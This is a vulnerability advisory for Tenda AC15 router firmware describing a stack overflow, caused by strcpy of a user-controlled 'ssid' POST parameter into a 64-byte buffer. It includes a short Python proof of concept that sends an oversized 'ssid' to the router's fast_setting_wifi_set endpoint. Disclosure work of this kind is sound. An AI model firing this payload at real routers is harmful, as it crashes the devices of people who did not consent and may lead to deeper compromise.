## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `form_fast_setting_wifi_set` function. The `src` variable receives the `ssid` parameter from a POST request and is later assigned to the `s` and `dest` variable, which is fixed at 64 bytes. However, since the user can control the input of  `ssid`, the statement `strcpy(dest, s);`and `strcpy(dest, src);` can cause a buffer overflow. The user-provided  `ssid` can exceed the capacity of the `s` and `dest` array, triggering this security vulnerability.

![image-20240305161750438](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305161750438.png)

![image-20240314160235128](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314160235128.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/fast_setting_wifi_set'

payload = {
    'ssid': 'a' * 1000
}

r = requests.post(url=url, data=payload)
print(r.content)
```

![image-20240314160304134](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314160304134.png)
